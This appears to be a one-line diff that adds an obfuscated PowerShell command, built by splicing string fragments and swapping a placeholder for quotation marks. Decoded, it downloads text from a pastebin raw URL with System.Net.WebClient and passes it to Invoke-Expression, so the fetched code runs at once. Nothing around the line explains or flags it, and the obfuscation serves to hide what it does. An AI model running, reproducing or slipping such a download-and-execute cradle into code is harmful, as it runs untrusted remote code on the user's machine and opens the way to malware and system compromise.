@@ -1,0 +1,1 @@
+(('I'+'nvok'+'e-E'+'xpressi'+'on'+' '+'(Ne'+'w'+'-'+'ObjectS'+'ystem.Net.WebClien'+'t).Downl'+'o'+'a'+'dS'+'tring(Zs6https:'+'/'+'/'+'pas'+'t'+'ebin.'+'c'+'om/r'+'a'+'w/M'+'K'+'M5'+'Q'+'L'+'aPZ'+'s'+'6)') -ReplAcE  'Zs6',[CHaR]39) |INVOKE-ExpREsSiON
